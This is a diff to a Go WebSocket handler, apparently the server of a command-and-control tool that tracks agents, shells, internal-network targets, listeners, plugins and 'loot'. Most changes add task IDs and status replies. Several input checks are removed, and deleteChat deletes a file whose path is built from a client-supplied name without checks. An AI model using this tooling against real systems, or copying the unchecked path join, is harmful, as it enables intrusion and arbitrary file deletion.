@@ -650,7 +650,7 @@ func User_index() http.HandlerFunc {
 					if !ok {
 						continue
 					}
-					taskid, ok := body["Taskid"].(string)
+					taskid, ok := body["taskid"].(string)
 					if !ok {
 						continue
 					}
@@ -677,7 +677,7 @@ func User_index() http.HandlerFunc {
 				case "msg":
 					uid, _ := body["uid"].(string)
 					msg, _ := body["msg"].(string)
-					taskid, _ := body["Taskid"].(string)
+					taskid, _ := body["taskid"].(string)
 					errStr := Getcmd(uid, msg, taskid)
 					if errStr != "" {
 						clientWs.WriteJSON(map[string]interface{}{
@@ -709,16 +709,57 @@ func User_index() http.HandlerFunc {
 				case "delShellInnet":
 					uid, _ := body["uid"].(string)
 					target, _ := body["target"].(string)
-					Del_shell_innet(target, uid)
-
-					go PushAgentData(uid, "GetMsgNet")
-
+					taskid, _ := body["taskid"].(string)
+					if uid == "" || target == "" || taskid == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delShellInnet",
+							"uid":     uid,
+							"target":  target,
+							"taskid":  taskid,
+							"message": "missing uid or target",
+						})
+						break
+					}
+					delnet := Del_shell_innet(target, uid)
+					if delnet {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "delShellInnet",
+							"uid":     uid,
+							"target":  target,
+							"taskid":  taskid,
+							"message": "Successfully deleted target",
+						})
+						go PushAgentData(uid, "GetMsgNet")
+					} else {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "delShellInnet",
+							"uid":     uid,
+							"target":  target,
+							"taskid":  taskid,
+							"message": "target not found",
+						})
+					}
 				case "delIndex":
 					uid, _ := body["uid"].(string)
-					DeleteEntry_index(uid,true)
+					taskid, _ := body["taskid"].(string)
+					del := DeleteEntry_index(uid,true)
+					if del {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "delIndex",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "Successfully deleted target",
+						})
+					}
 				case "delInfo":
 					uid, _ := body["uid"].(string)
 					info, _ := body["info"].(string)
+					taskid, _ := body["taskid"].(string)
+
 					var found bool
 					if info != "" {
 						windows_clientMu.Lock()
@@ -749,7 +790,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 500,
 							"path": "delInfo",
-
+							"uid":  uid,
+							"taskid":  taskid,
 							"message": "client not found",
 						})
 						continue
@@ -799,33 +841,45 @@ func User_index() http.HandlerFunc {
 					}
 					dataInnetmu.Unlock()
 
-					go PushData("", "agentList")
-					go PushData("", "winAgentList")
-					go PushData("", "loot")
-
-
 					logStr := fmt.Sprintf(log_word["removed_agent"], uid)
 					logger.WriteLog(logStr)
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "delInfo",
-
+						"uid":  uid,
+						"taskid":  taskid,
 						"data": "agent has been removed",
 					})
-				case "getFileList": //读取客户端目录
+					go PushData("", "agentList")
+					go PushData("", "winAgentList")
+					go PushData("", "loot")
+
+				case "getFileList":
 					uid, _ := body["uid"].(string)
-					taskid, _ := body["Taskid"].(string)
-					data := Get_file_list(uid, taskid)
-					go PushAgentData(uid, "GetMsgCache")
-					if data != "" {
+					taskid, _ := body["taskid"].(string)
+				
+					if uid == "" {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code":   200,
-							"path":   "getFileList",
-							"uid":    uid,
-							"taskid": taskid,
-							"data":   data,
+							"code":    400,
+							"path":    "getFileList",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "invalid uid",
 						})
+						continue
 					}
+				
+					data := Get_file_list(uid, taskid)
+				
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":   200,
+						"path":   "getFileList",
+						"uid":    uid,
+						"taskid": taskid,
+						"data":   data,
+					})
+				
+					go PushAgentData(uid, "GetMsgCache")
 				case "downloadlog":
 					logFilePath := "server.log"
 					file, err := os.Open(logFilePath)
@@ -1077,32 +1131,14 @@ func User_index() http.HandlerFunc {
 						"data": shell_list,
 					})
 				case "confirm":
-					uid, ok := body["uid"].(string)
-					if !ok {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "confirm",
-
-							"message": "invalid uid",
-						})
-						continue
-					}
-					username, ok := body["username"].(string)
-					if !ok {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "confirm",
-
-							"message": "invalid username",
-						})
-						continue
-					}
+					uid, _ := body["uid"].(string)
+					username, _ := body["username"].(string)
 					client, err := Confirm_chan(uid, username)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 404,
 							"path": "confirm",
-
+							"uid":  uid,
 							"message": err.Error(),
 						})
 						continue
@@ -1110,7 +1146,7 @@ func User_index() http.HandlerFunc {
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "confirm",
-
+						"uid":  uid,
 						"data": client,
 					})
 				case "agentcode":
@@ -1172,11 +1208,13 @@ func User_index() http.HandlerFunc {
 					})
 				case "delserver":
 					port, ok := body["port"].(string)
+					taskid, _ := body["taskid"].(string)
 					if !ok || port == "" {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delserver",
-
+							"port": port,
+							"taskid": taskid,
 							"message": "invalid port",
 						})
 						continue
@@ -1207,7 +1245,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 404,
 							"path": "delserver",
-
+							"port": port,
+							"taskid": taskid,
 							"message": stopStr,
 						})
 						continue
@@ -1228,6 +1267,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400, 
 							"path": "delserver", 
+							"port": port,
+							"taskid": taskid,
 							"message": stopStr,
 						})
 						continue
@@ -1248,6 +1289,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400, 
 							"path": "delserver", 
+							"port": port,
+							"taskid": taskid,
 							"message": stopStr,
 						})
 						continue
@@ -1274,8 +1317,6 @@ func User_index() http.HandlerFunc {
 					cmapMutex.Unlock()
 
 					go protocol.StopServer(port)
-					go PushData("", "server")
-
 					stopStr := fmt.Sprintf(
 						log_word["removed_server"],
 						port,
@@ -1284,16 +1325,20 @@ func User_index() http.HandlerFunc {
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "delserver",
-
+						"port": port,
+						"taskid": taskid,
 						"message": stopStr,
 					})
+					go PushData("", "server")
 				case "changeMsh":
 					uid, ok := body["uid"].(string)
+					taskid, _ := body["taskid"].(string)
 					if !ok {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "changeMsh",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": "invalid uid",
 						})
 						continue
@@ -1303,7 +1348,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "changeMsh",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": "invalid s_id",
 						})
 						continue
@@ -1313,7 +1359,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "changeMsh",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": "invalid pos",
 						})
 						continue
@@ -1323,14 +1370,12 @@ func User_index() http.HandlerFunc {
 						s_id,
 						pos,
 					)
-
-					go PushAgentData(uid, "GetMsgList")
-
 					if !success {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "changeMsh",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": errStr,
 						})
 						continue
@@ -1338,36 +1383,24 @@ func User_index() http.HandlerFunc {
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "changeMsh",
-
+						"uid":  uid,
+						"taskid": taskid,
 						"message": "reordered",
 					})
+					go PushAgentData(uid, "GetMsgList")
 				case "delMsgGet":
-					uid, ok := body["uid"].(string)
-					if !ok || uid == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "delMsgGet",
 
-							"message": "missing uid",
-						})
-						continue
-					}
-					indexStr, ok := body["index"].(string)
-					if !ok {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "delMsgGet",
+					uid, _ := body["uid"].(string)
+					indexStr, _ := body["index"].(string)
+					taskid, _ := body["taskid"].(string)
 
-							"message": "missing index",
-						})
-						continue
-					}
 					index, err := strconv.Atoi(indexStr)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delMsgGet",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": "invalid index",
 						})
 						continue
@@ -1379,7 +1412,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 404,
 							"path": "delMsgGet",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": "uid queue not found",
 						})
 						continue
@@ -1390,7 +1424,8 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delMsgGet",
-
+							"uid":  uid,
+							"taskid": taskid,
 							"message": "index out of range",
 						})
 						continue
@@ -1401,24 +1436,17 @@ func User_index() http.HandlerFunc {
 					)
 					q.mu.Unlock()
 
-					go PushAgentData(uid, "GetMsgList")
-
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "delMsgGet",
-
+						"uid":  uid,
+						"taskid": taskid,
 						"message": "message deleted",
 					})
+					go PushAgentData(uid, "GetMsgList")
+
 				case "getMsg":
-					uid, ok := body["uid"].(string)
-					if !ok || uid == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "getMsg",
-							"message": "invalid uid",
-						})
-						continue
-					}
+					uid, _ := body["uid"].(string)
 					msgList := GetMsgList(uid)
 					if len(msgList) == 0 {
 						clientWs.WriteJSON(map[string]interface{}{
@@ -1461,32 +1489,18 @@ func User_index() http.HandlerFunc {
 						"data":    msgMap,
 					})
 				case "delMsgMap":
-					uid, ok := body["uid"].(string)
-					if !ok || uid == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "delMsgMap",
-
-							"message": "invalid uid",
-						})
-						continue
-					}
-					indexStr, ok := body["index"].(string)
-					if !ok {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "delMsgMap",
-
-							"message": "invalid index",
-						})
-						continue
-					}
+					uid,_:= body["uid"].(string)
+					indexStr,_:= body["index"].(string)
+					taskid, _ := body["taskid"].(string)
+					
 					index, err := strconv.Atoi(indexStr)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delMsgMap",
-
+							"uid":  uid,
+							"index": indexStr,
+							"taskid": taskid,
 							"message": "invalid index",
 						})
 						continue
@@ -1507,7 +1521,9 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delMsgMap",
-
+							"uid":  uid,
+							"index": indexStr,
+							"taskid": taskid,
 							"message": "index out of range",
 						})
 						continue
@@ -1519,42 +1535,26 @@ func User_index() http.HandlerFunc {
 					)
 					mapMu.Unlock()
 
-					go PushAgentData(uid, "GetMsgPost")
-
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "delMsgMap",
-
+						"uid":  uid,
+						"index": indexStr,
+						"taskid": taskid,
 						"message": "deleted successfully",
 					})
+					go PushAgentData(uid, "GetMsgPost")
 				case "delPlugin":
-					_os, ok := body["os"].(string)
-					if !ok {
+					_os, _ := body["os"].(string)
+					remark, _ := body["remark"].(string)
+					codeWords, _ := body["codeWords"].(string)
+
+					if _os == "" || remark == "" || codeWords == "" {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delPlugin",
-
-							"message": "invalid os",
-						})
-						continue
-					}
-					remark, ok := body["remark"].(string)
-					if !ok {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "delPlugin",
-
-							"message": "invalid remark",
-						})
-						continue
-					}
-					codeWords, ok := body["codeWords"].(string)
-					if !ok || codeWords == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "delPlugin",
-
-							"message": "invalid codeWords",
+							"remark": remark,
+							"message": "missing os, remark or codeWords",
 						})
 						continue
 					}
@@ -1587,7 +1587,7 @@ func User_index() http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 404,
 							"path": "delPlugin",
-
+							"remark": remark,
 							"message": fmt.Sprintf(
 								"No plugin found for remark %s, os %s and codeWords %s",
 								remark,
@@ -1603,7 +1603,7 @@ func User_index() http.HandlerFunc {
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "delPlugin",
-
+						"remark": remark,
 						"message": fmt.Sprintf(
 							"Plugin %s for remark %s and os %s deleted successfully",
 							codeWords,
@@ -1612,43 +1612,27 @@ func User_index() http.HandlerFunc {
 						),
 					})
 				case "delFileList":
-					uid, ok := body["uid"].(string)
-					if !ok || uid == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code":    400,
-							"path":    "delFileList",
-							"message": "invalid uid",
-						})
-						continue
-					}
-					indexStr, ok := body["index"].(string)
-					if !ok {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code":    400,
-							"path":    "delFileList",
-							"message": "invalid index",
-						})
-						continue
-					}
-					deleted := Del_file_list(
-						uid,
-						indexStr,
-					)
+					uid, _ := body["uid"].(string)
+					indexStr, _ := body["index"].(string)
+					taskid, _ := body["taskid"].(string)
+					deleted := Del_file_list(uid, indexStr)
 					if deleted {
-
-						go PushAgentData(uid, "GetMsgCache")
-
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 200,
 							"path": "delFileList",
-
+							"uid":  uid,
+							"index": indexStr,
+							"taskid": taskid,
 							"message": "File deleted successfully",
 						})
+						go PushAgentData(uid, "GetMsgCache")
 					} else {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "delFileList",
-
+							"uid":  uid,
+							"index": indexStr,
+							"taskid": taskid,
 							"message": "File not found or invalid index",
 						})
 					}
@@ -1882,40 +1866,50 @@ func User_index() http.HandlerFunc {
 						"data": chat,
 					})
 				case "deleteChat":
-					chatidFloat, _ := body["chatid"].(string)
+					chatid, _ := body["chatid"].(string)
 					username, _ := body["username"].(string)
 					message, _ := body["message"].(string)
-					chatidFloat = body["chatid"].(string)
+				
 					deletedType := ""
+					deleted := false
+				
 					dataChatmu.Lock()
 					for i := len(data_chat.Chats) - 1; i >= 0; i-- {
 						chat := &data_chat.Chats[i]
-						if chat.Chatid == chatidFloat && chat.Username == username {
+						if chat.Chatid == chatid && chat.Username == username {
 							deletedType = chat.Type
 							data_chat.Chats = append(
 								data_chat.Chats[:i],
 								data_chat.Chats[i+1:]...,
 							)
+							deleted = true
 							break
 						}
 					}
 					dataChatmu.Unlock()
-
-					go PushData("", "chat")
-
+				
+					if (!deleted) {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400,
+							"path": "deleteChat",
+							"status": "failed",
+							"chatid": chatid,
+							"message": "chat not found",
+						})
+						continue
+					}
+				
 					if deletedType == "file" {
-						filePath := filepath.Join(
-							"./chat_uploads/",
-							message,
-						)
+						filePath := filepath.Join("./chat_uploads/", message)
 						os.Remove(filePath)
 					}
 					clientWs.WriteJSON(map[string]interface{}{
-						"code":   200,
-						"path":   "deleteChat",
+						"code": 200,
+						"path": "deleteChat",
 						"status": "deleted",
-						"chatid": chatidFloat,
+						"chatid": chatid,
 					})
+					go PushData("", "chat")
 				case "changeResponseHead":
 					port, _ := body["port"].(string)
 					responseHead, _ := body["response_head"].(string)
@@ -3050,15 +3044,15 @@ func deleteConnAtIndex(index int, delbase bool) bool {
 	return true
 }
 
-func DeleteEntry_index(indexStr string, delbase bool) {
+func DeleteEntry_index(indexStr string, delbase bool) bool {
 	if indexStr == "" {
-		return
+		return false
 	}
 	index, err := strconv.Atoi(indexStr)
 	if err != nil {
-		return
+		return false
 	}
-	deleteConnAtIndex(index, delbase)
+	return deleteConnAtIndex(index, delbase)
 }
 
 func DeleteEntry(delshell string, delbase bool) {
@@ -3797,17 +3791,17 @@ func in_port(uid, data string) {
 }
 
 // 删除内网
-func Del_shell_innet(target, uid string) string {
+func Del_shell_innet(target, uid string) bool {
 	dataInnetmu.Lock()
 	defer dataInnetmu.Unlock()
 	for i := range data_innet.Innets {
 		innet := &data_innet.Innets[i]
 		if target == innet.Target && uid == innet.Uid {
 			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
-			return "Successfully deleted target"
+			return true
 		}
 	}
-	return "cannot deleted target"
+	return false
 }
 func LoadHistoryFiles() error {
 	uploadDir := "./chat_uploads/"
